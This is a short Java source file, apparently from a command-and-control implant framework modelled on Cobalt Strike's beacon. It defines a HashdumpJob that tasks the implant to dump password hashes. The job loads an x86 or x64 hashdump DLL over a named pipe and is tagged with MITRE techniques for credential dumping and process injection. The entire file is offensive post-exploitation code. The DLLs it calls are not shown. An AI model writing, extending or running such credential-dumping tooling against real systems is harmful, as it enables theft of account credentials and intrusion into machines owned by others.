package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;

public class HashdumpJob
        extends Job {
    public HashdumpJob(TaskBeacon tasker) {
        super(tasker);
    }

    @Override
    public String getDescription() {
        return "Tasked beacon to dump hashes";
    }

    @Override
    public String getShortDescription() {
        return "dump password hashes";
    }

    @Override
    public String getDLLName() {
        if (this.arch.equals("x64")) {
            return "resources/hashdump.x64.dll";
        }
        return "resources/hashdump.dll";
    }

    @Override
    public String getPipeName() {
        return "hashdump";
    }

    @Override
    public String getTactic() {
        return "T1003, T1055";
    }

    @Override
    public int getCallbackType() {
        return 21;
    }

    @Override
    public int getWaitTime() {
        return 15000;
    }
}

